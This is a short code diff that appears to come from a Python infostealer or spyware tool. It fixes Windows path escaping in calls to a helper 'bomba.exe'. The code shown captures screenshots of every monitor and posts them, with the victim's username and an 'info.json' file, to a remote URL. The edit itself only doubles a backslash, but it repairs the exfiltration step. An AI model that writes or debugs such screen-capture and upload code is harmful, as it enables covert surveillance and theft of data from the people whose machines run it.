@@ -195,6 +195,6 @@ else:
     monitors = capture.list_monitors()
     for i in range(len(monitors)):
         mama = capture.capture_monitor(i, f'monitor{i}.png')
-        subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, "-T", f'"heres photos..."', "-user", f'"{username}"', "-photo", f"{mama}"])
+        subprocess.run([f'{value}\\bomba.exe', '-post', '-url', url, "-T", f'"heres photos..."', "-user", f'"{username}"', "-photo", f"{mama}"])
 
-    subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, '-json', '-path', f'{value}\info.json'])
+    subprocess.run([f'{value}\\bomba.exe', '-post', '-url', url, '-json', '-path', f'{value}\info.json'])
